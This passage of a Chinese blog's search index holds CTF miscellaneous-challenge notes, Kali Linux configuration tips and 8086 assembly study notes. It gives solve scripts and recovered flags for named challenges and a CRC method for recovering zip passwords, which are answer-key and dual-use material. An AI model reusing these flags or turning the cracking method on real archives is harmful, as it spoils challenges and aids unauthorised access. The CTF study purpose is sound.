ENDARC_HEAD(结束块)\n\n例如-题目：SimpleRAR\n根据rar文件组成，将secret.png的块类型从7A(子块)改为74(文件头)即可。\n","slug":"杂项摆烂小记05","date":"2023-08-25T12:30:34.000Z","categories_index":"杂项","tags_index":"杂项","author_index":"南瓜の无名"},{"id":"ad4ed1b6e7e9ecc858e20fd76a8a2ba5","title":"杂项摆烂的小记_进阶篇_04","content":"新的盐python2 ZeroDivisionError报错信息在Python 2.7中,ZeroDivisionError的完整错误信息类似如下:\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nZeroDivisionError: integer division or modulo by zero\n\npython3 ZeroDivisionError的错误信息类似如下：\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nZeroDivisionError: division by zero\n\n字符串ASCII码+1 gmbh 与 flag 的 ASCII码 相差 1\nc&#x3D;&#39;gmbh|237e9g47f3c597186b2892g62g52f255~&#39;\nd&#x3D;&#39;&#39;\nfor i in range(0,len(c)):\n k &#x3D; chr(ord(c[i])-1)\n d+&#x3D;k\nprint(d)\n# flag&#123;126d8f36e2b486075a1781f51f41e144&#125;\n\njd-gui打开jar包\n\n\n\n\n\n\n\n\n下载网址：https://github.com/java-decompiler/jd-gui/releases\n简单的日期排序拼图脚本\n\n\n\n\n\n\n\n\n不要忘记我们还有montage拼接图片，和gaps配合可以十分高效的解决拼图题。\n#-*- coding:utf-8 -*-\nimport PIL.Image as Image\nimport os\n \nIMAGES_PATH &#x3D; &#39;文件夹&#39;  \nIMAGES_FORMAT &#x3D; [&#39;.jpg&#39;, &#39;.JPG&#39;]  \nIMAGE_SIZE &#x3D; 256  \nIMAGE_ROW &#x3D; 14  #生成图片的行\nIMAGE_COLUMN &#x3D;6 #生成图片的列\nIMAGE_SAVE_PATH &#x3D; &#39;.&#x2F;flag.jpg&#39;  #结果保存地址\n\n#按修改时间排序\ndef sort_file_by_time(file_path):\n    files &#x3D; os.listdir(file_path)\n    if not files:\n        return\n    else:\n        files &#x3D; sorted(files, key&#x3D;lambda x: os.path.getmtime(os.path.join(file_path, x)))\n        return files\nimage_names &#x3D; sort_file_by_time(IMAGES_PATH)\nprint(image_names)\n\n# 简单的对于参数的设定和实际图片集的大小进行数量判断\nif len(image_names) &gt; IMAGE_ROW * IMAGE_COLUMN:\n    raise ValueError(&quot;不能合成图片！&quot;)\ndef image_compose():\n    to_image &#x3D; Image.new(&#39;RGB&#39;, (IMAGE_COLUMN * IMAGE_SIZE, IMAGE_ROW * IMAGE_SIZE)) \n    for y in range(1, IMAGE_ROW + 1):\n        for x in range(1, IMAGE_COLUMN + 1):\n            from_image &#x3D; Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - 1) + x - 1]).resize(\n                (IMAGE_SIZE, IMAGE_SIZE),Image.ANTIALIAS)\n            to_image.paste(from_image, ((x - 1) * IMAGE_SIZE, (y - 1) * IMAGE_SIZE))\n    return to_image.save(IMAGE_SAVE_PATH)\nimage_compose() \n\ncrc爆破压缩包密码\n\n\n\n\n\n\n\n\n工具下载:https://gitcode.net/mirrors/theonlypwner/crc32?utm_source=csdn_github_accelerator\n例：python crc.py reverse 0xCC863658\n\n依次爆破crc，得到解压密码。\n拼图工具gaps安装及使用安装git clone https:&#x2F;&#x2F;github.com&#x2F;wallevy&#x2F;gaps  \n\n网上的教程都提到pip安装requirements.txt里面的依赖项，但是我克隆的项目没有requirements.txt，所以选择个内容类似的项目对照，可以参照网上的一些文章补充。\n# requirements.txt\npillow ~&#x3D; 10.0.0\nnumpy ~&#x3D; 1.24\nmatplotlib ~&#x3D; 3.7.2\nopencv-python ~&#x3D; 4.8.0.74\nclick ~&#x3D; 8.1.6\n\npython3 -m pip install -r requirements.txt\n\n依次安装依赖项，如果你之前的杂项工具都有认真安装，其实到这里依赖项都是已经安装齐全的状态（?）。\nsudo apt-get install python-tk\n\n我还根据github项目上的说明安装了一些其他无用的东西，理论上并不影响是否安装成功，但是以防万一还是装了。\n下面这一步应该是我认为比较关键的一步，\nsudo pip install -e .\n\n如果不用sudo的会无法输出图片，可能是缺少一些依赖项，所幸最后还是安装好了，长达三个小时的错误尝试经历。\n我这边安装完之后显示gaps的目录&#x2F;home&#x2F;kali&#x2F;.local&#x2F;bin没有添加到环境变量，到这一步就简单了，\n把&#x2F;home&#x2F;kali&#x2F;.local&#x2F;bin目录添加到环境变量就可以，可以参考之前写过的https://nanguawuming.github.io/post/note_%E5%85%B3%E4%BA%8EKali%E7%9A%84%E6%97%A0%E7%94%A8%E7%9F%A5%E8%AF%86里面关于环境变量的无用知识，希望可以帮助你绕过一些坑。\n# gaps --help\ngaps run demo_puzzle.jpg flag.jpg --generations&#x3D;20 --population&#x3D;500\n\n&#x2F;&#x2F; 如果正常出现帮助文档说明安装成功。也不一定，保险起见可以利用~&#x2F;gaps&#x2F;images目录里面的几张测试图片测试一下，看看能否正常输出。\n使用\n\n\n\n\n\n\n\n\n先使用montage或者任意脚本把零散的拼图拼接成一张。\nUsage: gaps run [OPTIONS] PUZZLE SOLUTION\n主要参数含义:\n\nPUZZLE: 输入拼图图片文件\nSOLUTION: 输出解决后的拼图结果图片文件可选参数:\n–size: 每个拼图小块的像素大小,如果不指定会自动检测\n–generations: 遗传算法运行的代数\n–population: 初始种群大小\n–debug: 是否开启调试模式,每代都输出最优个体\n\n使用示例:\ngaps run puzzle.jpg solution.jpg --size&#x3D;32 --generations&#x3D;100 --population&#x3D;1000\n\n\n\n\n\n\n\n\n\n\n比起安装，gaps使用起来就很简单了，是一款很实用的工具。有了这个工具，一般的拼图题，可以嘎嘎乱杀。\n题目：qr-easy手工二维码填补\n\n\n\n\n\n\n\n\n\n参考：https://blog.csdn.net/aa2528877987/article/details/122884951参考：http://www.huiyao.love/2021/08/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-qr-easy/\n题目：message打开题目是一串十六进制，把它转成二进制，然后放入world里面，发现有1679个字符，1679&#x3D;23*73，以每73个字符为一行进行排列，然后把0换成比较明显的符号，摘掉眼镜就可以看的很清楚。\n题目：双色块\n\n\n\n\n\n\n\n\nhttps://bbs.huaweicloud.com/blogs/329981\n解析gif图片分离成单帧模式\n#! &#x2F;usr&#x2F;bin&#x2F;env python2\n# -*- coding: utf-8 -*-\n\nimport os\nfrom PIL import Image\n\ndef main(gif_file):\n    png_dir &#x3D; &#39;frame&#x2F;&#39;\n    img &#x3D; Image.open(gif_file)\n    try:\n        while True:\n            current &#x3D; img.tell()\n            img.save(png_dir + str(current + 1) + &#39;.png&#39;)\n            img.seek(current + 1)\n    except:\n        pass\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    gif_file &#x3D; &#39;out.gif&#39;\n    main(gif_file)\n\n读取每个png中的对应点的信息，并按照8bit转换为ascii\n#! &#x2F;usr&#x2F;bin&#x2F;env python2\n# -*- coding: utf-8 -*-\n\nimport os\nfrom PIL import Image\n\ndef main():\n    png_dir &#x3D; &#39;frame&#x2F;&#39;\n    ret &#x3D; &quot;&quot;\n    for i in range(0,24):\n        line &#x3D; &quot;&quot;\n        for j in range(0,24):\n            file_name &#x3D; &quot;frame&#x2F;&quot; + str(i * 24 + j + 1) + &quot;.png&quot;\n            x &#x3D; j * 10 + 5\n            y &#x3D; i * 10 + 5\n            img &#x3D; Image.open(file_name)\n            img &#x3D; img.convert(&quot;RGB&quot;) \n            img_array &#x3D; img.load()\n            r, g, b &#x3D; p &#x3D; img_array[x, y]\n            if g &#x3D;&#x3D; 255:\n                line +&#x3D; &quot;0&quot;\n            if r &#x3D;&#x3D; 255 and b &#x3D;&#x3D; 255:\n                line +&#x3D; &quot;1&quot;\n            if len(line) &#x3D;&#x3D; 8:\n                ret +&#x3D; chr(int(line, 2))\n                line &#x3D; &quot;&quot;\n    print(ret)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\n题目：time_losing每个文件的时间戳都会和源时间戳有一个差值，这差值对应一个字符，连起来就是flag\nimport os,time  #查找处理文件要调用os库 先用import 导入\n?\noldtime&#x3D;2000000000\na&#x3D;&quot;&quot;\n?\nfor i in range(0,47): #有0~46个txt文件 就是循环47次\n   file &#x3D; r&quot;C:\\Users\\12275\\Desktop\\stego\\&#123;0&#125;.txt&quot;.format(i)  #文件路径\n   newtime &#x3D; int(os.path.getmtime(file))  #获取最近修改的时间\n   s &#x3D; newtime - oldtime\n   a &#x3D; a+chr(s)   #将差值转为ASCII码\nprint(a)\n\n题目：catnim\n\n\n\n\n\n\n\n\n尼姆博弈：https://zhuanlan.zhihu.com/p/358979118没有完全看懂，但是感觉还是很有意思的。\n尼姆博弈只要满足每一轮拿掉物品之后的所有堆异或值为0即可。\n设一共有n堆，让n-1堆先异或得到一个值xo，从剩下的那一堆拿掉一些值t，使其等于xo就行。如何选取剩下的那个值很重要，因为有时(很多时候)，取的那个值小于xo，这就无法从里面取值，解决方案也很简单，就是从min开始遍历。\nfrom pwn import *\nimport copy\n\nio &#x3D; remote(&#39;223.112.5.156&#39;,51013)\nprint(io.recvuntil(b&#39;Do you want just have a try,if you do that you can not get flag and without time limit(Y&#x2F;N)?&#39;))\nio.sendline(b&#39;N&#39;)\nio.recvline()\n\nwhile True:\n        pile &#x3D; io.recvline().strip()\n        start &#x3D; pile.find(b&#39;: &#39;)\n        piles &#x3D; list(map(int,pile[start+2:].split(b&#39; &#39;)))\n        # 浅拷贝\n        piles_ &#x3D; copy.copy(piles)\n        print(piles_)\n        piles.sort()\n        print(piles_)\n        j &#x3D; 0\n        while True:\n            # 这里从最小一个数遍历，用最大数会超时\n            min_num &#x3D; piles[j]\n            print(&#39;min&#39;,min_num)\n            index &#x3D; piles_.index(min_num)\n            print(&#39;index&#39;,index)\n            xo &#x3D; 0\n            ff &#x3D; True\n            for i in piles:\n                if i &#x3D;&#x3D; min_num:\n                    if ff &#x3D;&#x3D; True:\n                        ff &#x3D; False\n                        continue\n                xo &#x3D; xo ^ i\n            if min_num &gt; xo:\n                print(&#39;xo&#39;,xo)\n                t &#x3D; min_num - xo\n                print(&#39;t&#39;,t)\n                print(io.recvuntil(b&#39;where:&#39;))\n                io.sendline(str(index).encode())\n                print(io.recvuntil(b&#39;count:&#39;))\n                io.sendline(str(t).encode())\n                print(io.recvline())\n                print(io.recvline())\n                print(io.recvline())\n                break\n            j &#x3D; j + 1\n            print(j)\n\n\n隐写术outguess算法-图片隐写# 安装\nsudo apt-get install outguess\n# 使用\noutguess -r 1.jpg -t hidden.txt\n\ngif文件提取帧+二维码修复stegslove提取gif动图中带有二维码的帧。\n补全二维码的四个角。\n\n编码和密码uuencode编码\n\n\n\n\n\n\n\n\n在线网站：https://www.qqxiuzi.cn/bianma/uuencode.php\n# 格式：\nbegin &lt;模式&gt; &lt;文件名&gt;\n&lt;数据&gt;\nend\n\n例如：\n# Hello World\nbegin 666 &lt;data&gt;\nIT&amp;5H%&#x2F;,@&#x3D;V]R;&amp;0&#96;\n&#96;\nend\n\nDES解密\n\n\n\n\n\n\n\n\n在线解密网址：http://tool.chacuo.net/cryptdes\n例：\n密文：o8DlxK+H8wsiXe&#x2F;ERFpAMaBPiIcj1sHyGOMmQDkK+uXsVZgre5DSXw&#x3D;&#x3D;\n密钥：ctfer2333\n明文：flag&#123;2ce3b416457d4380dc9a6149858f71db&#125;\n","slug":"杂项摆烂小记04","date":"2023-08-25T12:30:34.000Z","categories_index":"杂项","tags_index":"杂项","author_index":"南瓜の无名"},{"id":"bfefb2c0f0b8f734361ed5a8a7fee1a4","title":"关于kali的无用知识","content":"\n\n\n\n\n\n\n\n\n使用kali时一些知识的整理，也许在Ubuntu或者Debian也适用。\nkali 修改主机名称sudo hostnamectl set-hostname your-new-hostname\n# your-new-hostname 为你想要更改的新主机名。\n\nsudo vim &#x2F;etc&#x2F;hosts\n127.0.0.1   your-new-hostname\n\n# 重启后就会变成新的主机名。\n\nkali 命令行打开图片sudo apt-get install imagemagick    #安装 ImageMagick\n\ndisplay test.png\n\n\n\n\n\n\n\n\n\n\n也可以选择安装eog或者fim。\nkali 虚拟机配置代理\n\n\n\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/461316494\n设置局部代理\n物理机安装clash（安装教程看官网ikuuu.art），打开系统代理，设置允许局域网链接。\n\n\n\n打开kali 系统的 &#x2F;etc&#x2F;proxychains4.conf 文件，在文件末尾添加ip地址，例如 socks5 192.168.1.1 7777，端口是 clash 代理的端口。\n\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to &quot;tor&quot;\n#socks4    127.0.0.1 9050\n\n# example\nsocks5  192.168.1.1 7777\n\n\n&#x2F;etc&#x2F;proxychains4.conf 配置文件里的 proxy_dns 这一行的记得给注释掉，然后保存\n\n验证是否成功，输入以下命令:\n\n\nproxychains curl ip.sb \n或\nproxychains curl cip.cc\n\n\n出现如下图说明配置成功了\n\n\n\n使用代理下载，在命令前加上proxychains就可以。\n\n使用redsocks全局代理\nkali系统内置的redsocks可以实现全局代理；\n\n打开配置文件找到redsocks方括号里的ip和port修改ip和端口：\n\n\nvim &#x2F;etc&#x2F;redsocks.conf\n\nbase &#123;\n\tlog_debug &#x3D; off;\n\tlog_info &#x3D; on;\n\tdaemon &#x3D; off;\n\tredirector &#x3D; iptables;\n&#125;\n\nredsocks &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 12345; &lt;&#x3D; 这个端口是tcp监听端口\n\n\tip &#x3D; 127.0.0.1;  &lt;&#x3D; socks5 服务地址 \n\tport &#x3D; 1081;  &lt;&#x3D; socks5 服务端口\n\n\ttype &#x3D; socks5; &lt;&#x3D; 一般都是 socks5 （ss, tro..）\n&#125;\n\nredudp &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 10053; &lt;&#x3D; 这个端口是udp监听端口\n\n\tip &#x3D; 127.0.0.1; &lt;&#x3D; socks5 服务地址\n\tport &#x3D; 1081; &lt;&#x3D; socks5 服务端口\n\n\t&#x2F;&#x2F; login &#x3D; username;  &lt;&#x3D; 无需登录信息，可以删除\n\t&#x2F;&#x2F; password &#x3D; pazzw0rd; &lt;&#x3D; 同上\n\n\tdest_ip &#x3D; 8.8.8.8;\n\tdest_port &#x3D; 53;\n\n\tudp_timeout &#x3D; 30;\n\tudp_timeout_stream &#x3D; 180;\n&#125;\n\ndnstc &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 5300;\n&#125;\n\ndnsu2t &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 5313;\n\n\tremote_ip &#x3D; 8.8.8.8;\n\tremote_port &#x3D; 53;\n&#125;\n\n\n使用sudo redsocks命令运行redsocks，\n在桌面目录新建一个目录，然后新建一个iptables.sh名的文件,复制以下内容在文件里，\n\n#不重定向目的地址为服务器的包\niptables -t nat -A OUTPUT -d 192.168.0.84 -j RETURN  #请用你的shadowsocks服务器的地址替换$SERVER_IP\n \n#不重定向私有地址的流量\niptables -t nat -A OUTPUT -d 10.0.0.0&#x2F;8 -j RETURN\niptables -t nat -A OUTPUT -d 172.16.0.0&#x2F;16 -j RETURN\niptables -t nat -A OUTPUT -d 192.168.0.0&#x2F;16 -j RETURN\n \n#不重定向保留地址的流量,这一步很重要\niptables -t nat -A OUTPUT -d 127.0.0.0&#x2F;8 -j RETURN\n \n#重定向所有不满足以上条件的流量到redsocks监听的12345端口\niptables -t nat -A OUTPUT -p tcp -j REDIRECT --to-ports 12345 #12345是你的redsocks运行的端口,请根据你的情况替换它\n\n\n执行 iptables.sh ：\n\nsudo sh iptables.sh\n\n\n输入curl ip.sb列出的IP地址和proxychains curl ip.sb列出的IP地址一致，说明配置成功\n\n\n关闭redsocks全局代理\n你可以使用以下命令查看当前iptables规则：\n\niptables -t nat -L\n\n\n如果你想关闭全局代理，可以写一个uniptables.sh并运行：\n\niptables -t nat -D OUTPUT -d 192.168.0.84 -j RETURN \n#请用你的shadowsocks服务器的地址替换$SERVER_IP\n\niptables -t nat -D OUTPUT -d 10.0.0.0&#x2F;8 -j RETURN\niptables -t nat -D OUTPUT -d 172.16.0.0&#x2F;16 -j RETURN\niptables -t nat -D OUTPUT -d 192.168.0.0&#x2F;16 -j RETURN\niptables -t nat -D OUTPUT -d 127.0.0.0&#x2F;8 -j RETURN\n\niptables -t nat -D OUTPUT -p tcp -j REDIRECT --to-ports 12345 \n#12345是你的redsocks运行的端口,请根据你的情况替换它\n\n\n此时iptables规则应为空\n\n找到redsocks的pid，并关闭redsocks的进程：\n\n\npidof redsocks\nsudo kill （redsocks的pid）\n\nkali 添加环境变量命令行临时添加环境变量export PATH&#x3D;&quot;$PATH:&#x2F;home&#x2F;kali&#x2F;.local&#x2F;bin&quot;\n\n关闭shell就失效，每次打开都要重复输入命令。\n修改配置文件永久添加环境变量首先应当确认shell的配置文件是哪个，kali有 ~&#x2F;.bashrc 也有 ~&#x2F;.zshrc ，网上大多数都是让你修改 .bashrc 或者 .profile 之类的文件，但事实上我查看我的kali需要修改的是 ~&#x2F;zshrc文件\necho $SHELL\n# &#x2F;usr&#x2F;bin&#x2F;zsh\n\n打开配置文件，vim ~&#x2F;.zshrc，在末尾添加你要加入的环境变量，比如我这里添加的是&#x2F;home&#x2F;kali&#x2F;.local&#x2F;bin目录\nexport PATH&#x3D;&quot;$PATH:&#x2F;home&#x2F;kali&#x2F;.local&#x2F;bin&quot;\n\n重启shell，查看环境变量，可以看到新的环境变量添加成功了\necho $PATH\n# &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games:&#x2F;home&#x2F;kali&#x2F;.local&#x2F;bin\n\nkali 使用 tmux 分屏sudo apt-get install tmux  # 安装tmux\n\n\n先按住CTRL+b，松开，\n再按 Shift + 5 左右分屏\nShift + ‘ 上下分屏\no（小写O），就可以切到下一个pane。\n;（分号）， 就可以切换到上一个pane。\n\n\n\nkali 修改中文目录为英文目录# 移动中文目录到英文目录\nmv 桌面 Desktop\nmv 下载 Downloads \nmv 模板 Templates \nmv 公共 Public\nmv 音乐 Music \nmv 文档 Documents \nmv 图片 Pictures \nmv 视频 Videos \n\n修改配置文件 ~&#x2F;.config&#x2F;user-dirs.dirs重新指定系统文件夹：\nXDG_DESKTOP_DIR&#x3D;&quot;$HOME&#x2F;Desktop&quot;\nXDG_DOWNLOAD_DIR&#x3D;&quot;$HOME&#x2F;Downloads&quot;\nXDG_TEMPLATES_DIR&#x3D;&quot;$HOME&#x2F;Templates&quot;\nXDG_PUBLICSHARE_DIR&#x3D;&quot;$HOME&#x2F;Public&quot;\nXDG_DOCUMENTS_DIR&#x3D;&quot;$HOME&#x2F;Documents&quot;\nXDG_MUSIC_DIR&#x3D;&quot;$HOME&#x2F;Music&quot;\nXDG_PICTURES_DIR&#x3D;&quot;$HOME&#x2F;Pictures&quot;\nXDG_VIDEOS_DIR&#x3D;&quot;$HOME&#x2F;Videos&quot;\n\nreboot # 重启\n\nkali docker的安装及换源安装sudo apt-get install docker.io\n\n换源修改&#x2F;etc&#x2F;docker&#x2F;daemon.json\nvim &#x2F;etc&#x2F;docker&#x2F;daemon.json\n\n&#123;\n    &quot;registry-mirrors&quot;:[&quot;--你要换的国内源--&quot;]\n&#125;\n\n重启docker\nsudo systemctl daemon-reload \nsudo systemctl restart docker\n# 设置docker开机启动\nsudo systemctl enable docker\n\nkali 设置回收站\n创建回收站目录\n\nmkdir ~&#x2F;recycle_bin\n\n\n打开终端配置文件（使用$SHELL命令查看），kali是~/.zshrc，并添加以下行，将rm命令替换为将文件移动到回收站目录：\n\nalias rm&#x3D;&#39;mv -t ~&#x2F;recycle_bin&#39;\n\n\n在终端中运行以下命令，使更改生效：\n\nsource ~&#x2F;.bashrc\n# 或 source \\~&#x2F;.bash_aliases\n\n\n可以设置一个定时任务来定期清空回收站目录：\n\n# 需要root权限\ncrontab -e\n\n\n在打开的文件中添加：\n\n0 3 * * * rm -rf \\~&#x2F;recycle_bin&#x2F;*\n# 每天的凌晨3点清空回收站目录\n\n\n\n\n\n\n\n\n\n\n嗯，alias是一个很有趣的命令\nkali 安装多个版本的python\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/qq_42571592/article/details/122902266\n最新版本的python和pip在安装和运行一些工具时可能会不兼容。\nkali 权限相关命令确定文件的权限使用ls命令，有关选项-l和-d\n\nls -l 可以查看当前目录下所有文件和子目录的权限\nls -ld 列出当前目录自身的权限\n\n","slug":"note_关于Kali的无用知识","date":"2023-08-25T07:20:34.000Z","categories_index":"无用空间","tags_index":"Kali","author_index":"南瓜の无名"},{"id":"c056fa5ea8e6220d71e866be2b6f171d","title":"8086汇编学习笔记_01","content":"一、寄存器（CPU工作原理）CPU概述\n\n运算器，控制器，寄存器等器件，这些器件靠内部总线相连；\n\n8086 CPU 有14个寄存器：\nAX BX CX DX SI DI SP BP IP CS SS DS ES PSW\n\n通用寄存器有8个, 又可以分成2组,\n一组是数据寄存器(4个),另一组是指针寄存器及变址寄存器(4个).\n\n1.数据寄存器分为:\n　　AH&amp;AL＝AX(accumulator)：累加寄存器，常用于运算;\n在乘除等指令中指定用来存放操作数,\n另外,所有的I&#x2F;O指令都使用这一寄存器与外界设备传送数据.\n　　BH&amp;BL＝BX(base)：基址寄存器，常用于地址索引；\n　　CH&amp;CL＝CX(count)：计数寄存器，常用于计数；\n常用于保存计算值,如在移位指令,循环(loop)和串处理指令中用作隐含的计数器.\n　　DH&amp;DL＝DX(data)：数据寄存器，常用于数据传递。\n　　他们的特点是,这4个16位的寄存器可以分为高8位: AH, BH, CH, DH.\n    以及低八位：AL,BL,CL,DL。这2组8位寄存器可以分别寻址，并单独使用。\n\n2.另一组是指针寄存器和变址寄存器，包括：\n　　SP（Stack Pointer）：堆栈指针，与SS配合使用，可指向目前的堆栈位置；\n　　BP（Base Pointer）：基址指针寄存器，可用作SS的一个相对基址位置；\n　　SI（Source Index）：源变址寄存器，可用来存放相对于DS段之源变址指针；\n　　DI（Destination Index）：目的变址寄存器，可用来存放相对于 ES 段之目的变址指针。\n\nDS(DATA SEGMENT)数据段寄存器，用于定义数据；\nCS(CODE SEGMENT)代码段寄存器，用于存放代码；\nSS(STACK SEGMENT)堆栈段寄存器，用于存放入栈数据；\nES(EXTRA SEGMENT)附加段寄存器，用于存放串操作的目的操作数和辅助存储；\n\nIP（instruction pointer）指令指针，与CS代码段配合使用，指向指令的偏移地址。\nFR（flag register）或PSW（programme status word）标志&#x2F;程序状态字寄存器，\n是一个特殊的寄存器，按位起作用，用来控制CPU的工作方式或存放相关指令的执行状态。\n有意义的有9位，其中6位状态位，3位控制位。状态位用来记录执行结果的状态。\n包括ZF（结果为0）、PF（结果中1的奇偶）、SF（正负符号）、\nCF（无符号数最高位进位值）、OF（结果溢出）、AF（辅助进位）；\n控制位包括DF（方向标志位，控制串处理指令中SI,DI的增减）、\nIF（中断允许）、TF（是否允许单步中断跟踪调试）。\n\n1. 通用寄存器8086 CPU所有的寄存器都是16位的，可以存放两个字节。\nAX BX CX DX 通用寄存器\nAX –&gt; AH + AL\n2. 字在寄存器中的存储一个字可以存在一个16位寄存器中；\n3. 几条汇编指令汇编指令不区分大小写；\nmov ax,18   将18送入AX      AX&#x3D;18add ax,8    将寄存器AX中的数值加上8     AX&#x3D;AX+8\n4. 物理地址CPU访问内存单元时要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间。\n我们将这个唯一的地址称为物理地址。\n5. 16位结构的CPU特征\n运算器一次最多可以处理16位的数据；\n\n寄存器的最大宽度为16位；\n\n寄存器和运算器之间的通路是16位；\n\n\n6. 8086 CPU给出物理地址的方法8086有20位地址总线，可传送20位地址，寻址能力为1M。\n8086内部为16位结构，它只能传送16位的地址，表现出的寻址能力却只有64KB。\n\n地址加法器工作原理:\n\n段地址x16+偏移地址&#x3D;物理地址\n# 段地址x16 --&gt; 数据左移4位\n\n7. 段的概念内存并没有分段。\n段的划分来自于CPU，由于8086 CPU用“段地址x16+偏移地址&#x3D;物理地址”的方式给存储内存单元的物理地址，使得我们可以用分段的方式是来管理内存。\n段地址x16必然是16的倍数，所以一个段的起始地址也一定是16的倍数；偏移地址为16位，16位地址的寻址能力为64k，所以一个段的长度最大为64k；\n8. 内存单元地址小结CPU访问内存单元时，必须向内存提供内存单元的物理地址；8086 CPU在内部用段地址和偏移地址移位相加的方法形成最终的物理地址。\n9. 段寄存器段寄存器时提供段地址的。\nCS DS SS ES 段寄存器\n当8086 CPU要访问内存时，由这4个段寄存器提供内存单元的段地址。\n10. CS和IPCS和IP时8086 CPU中最关键的寄存器，他们指示了CPU当前要读取指令的地址。\n\nCS为代码段寄存器；\nIP为指令指针寄存器。\n\n\n8086 PC工作过程的简单描述：\n\n从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器；\n\nIP&#x3D;IP+所读取指令的长度，从而指向下一条指令；\n\n执行指令。转到1，重复这个过程。\n\n\n11. 修改CS,IP的指令在CPU中，程序员能够用指令读写的部件只有寄存器，程序员可以通过改变寄存器中的内容实现对CPU的控制。\nCPU从何处执行指令是由CS,IP中的内容决定的，程序员可以通过改变CS,IP中的内容来控制CPU执行目标指令。\nmov指令可以改变8086 CPU大部分寄存器的值，被称为传送指令。\nmov指令不能用于设置CS,IP的值，8086 CPU没有提供这样的功能。8086 CPU为CS,IP提供了另外的指令来改变它们的值：转移指令。\n# 同时修改CS,IP的内容：\njmp 段地址：偏移地址\n# 功能：用指令中给出的段地址修改CS，偏移地址修改IP。\n\n#仅修改IP的内容：\njmp 某一合法寄存器\n# 功能：用寄存器中的值修改IP。\n\n12. 代码段对于8086 PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。\n\n段地址在8086 CPU的寄存器中存放。当8086 CPU要访问内存时，由段寄存器提供内存单元的段地址。8086 CPU有4个段寄存器，其中CS用来存放指令的段地址。\n\nCS存放指令的段地址，IP存放指令的偏移地址。\n\n\n8086机中，任意时刻，CPU将CS:IP指向的内容当作指令执行。\n\n8086 CPU的工作过程：\n\n· 从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器；\n· IP指向下一条指令；\n· 执行指令。（转到开头，重复这个过程）\n\n4.8086 CPU提供转移指令jmp修改CS,IP的内容。\n13. debug功能用Debug的r命令查看，改变CPU寄存器的内容；用Debug的d命令查看内存中的内容；用Debug的e命令改写内存中的内容；用Debug的u命令将内存中的机器指令翻译成汇编指令；用Debug的t命令执行一条机器指令；用Debug的a命令以汇编指令的格式在内存中写入一条机器指令；\n记忆：true ad （真 广告）\n二、寄存器（内存访问）1. 内存中字的存储任何两个地址连续的内存单元，N号单元和N+1号单元，可以将它们看成两个内存单元，也可以看成一个地址为N的子单元中的高位字节单元和低位字节单元。\n2. DS和[address]CPU要读取一个内存单元的时候，必须先给出这个内存单元的地址；在8086 PC中，内存地址由段地址和偏移地址组成；8086 CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址。\n&#x2F;&#x2F; 读取10000H单元的内容:\nmov bx,1000H\nmov ds,bx\nmov al,[0]      &#x2F;&#x2F; mov [0],al\n&#x2F;&#x2F; 将10000H（1000:0）中的数据读到al中。\n\n\n&#x2F;&#x2F; mov指令可完成的两种传送功能：\n&#x2F;&#x2F; 1.将数据直接送入寄存器；\n&#x2F;&#x2F; 2.将一个寄存器中的内容送入另一个寄存器中;\n&#x2F;&#x2F; 除此之外，mov指令还可以将一个内存单元中的内容送入一个寄存器。\n\n&#x2F;&#x2F;mov ds,1000H是非法的。\n\n执行指令时，8086CPU自动取DS中的数据为内存单元的段地址。\n数据-&gt;通用寄存器-&gt;段寄存器\n3. 字的传送因为8086CPU是16位结构，有16根数据线，所以，可以一次性传送16位数据，也就是一次性传送一个字。\nmov bx,1000H\nmov ds,bx\nmov ax[0]   ;1000:0处的字型数据送入ax\nmvo[0],cx   ;cx中的16位数据送到1000:0处\n\n4. mov、add、sub指令&#x2F;&#x2F; 已学mov指令的几种形式：\nmov 寄存器，数据\nmov 寄存器，寄存器\nmov 寄存器，内存单元\nmov 内存单元，寄存器\n\n&#x2F;&#x2F;add和sub指令同mov一样，都有两个操作对象。\n\nmov 段寄存器，寄存器\n\n5. 数据段我们可以将一组长度为N（N &lt;&#x3D; 64k）、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段。\n· 参考一：\nmov ax,123BH\nmov ds,ax       ;将123BH送入ds中，作为数据段的段地址\nmov al,0        ;用al存放累加结果\nadd al,[0]      ;将数据段第一个单元（偏移地址为0）中的数值加到al中\nadd al,[1]      ;将数据段第二个单元（偏移地址为1）中的数值加到al中\nadd al,[2]      ;将数据段第三个单元（偏移地址为2）中的数值加到al中\n\n注意：一个字型数据占两个单元，所以偏移地址是0、2、4\n· 参考二：\nmov ax,123BH\nmov ds,ax       ;将123BH送入ds中，作为数据段的段地址\nmov ax,0        ;用ax存放累加结果\nadd al,[0]      ;将数据段第一个单元（偏移地址为0）中的数值加到al中\nadd al,[2]      ;将数据段第二个单元（偏移地址为1）中的数值加到al中\nadd al,[4]      